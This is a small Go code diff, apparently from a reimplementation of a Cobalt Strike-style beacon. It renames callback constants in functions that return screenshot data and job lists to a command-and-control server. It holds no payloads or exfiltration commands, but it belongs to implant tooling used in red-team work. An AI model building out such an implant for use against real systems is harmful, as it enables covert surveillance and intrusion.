@@ -345,7 +345,7 @@ func HandlerJobAsync(b []byte) error {
 		}
 		// job name in 4.0 and 4.1+ is also different, so use callback type is more wisely
 		switch callbackType {
-		case CALLBACK_SCREENSHOT:
+		case packet.CALLBACK_SCREENSHOT:
 			// take screenshot will have 4 bytes to indicate the data length, but server doesn't deal with it
 			result = result[4:]
 		default:
@@ -361,7 +361,7 @@ func ListJobs() error {
 	for _, job := range jobs {
 		result += fmt.Sprintf("%d\t%d\t%s\n", job.jid, job.pid, job.description)
 	}
-	packet.PushResult(CALLBACK_LIST_JOBS, []byte(result))
+	packet.PushResult(packet.CALLBACK_LIST_JOBS, []byte(result))
 	return nil
 }
 
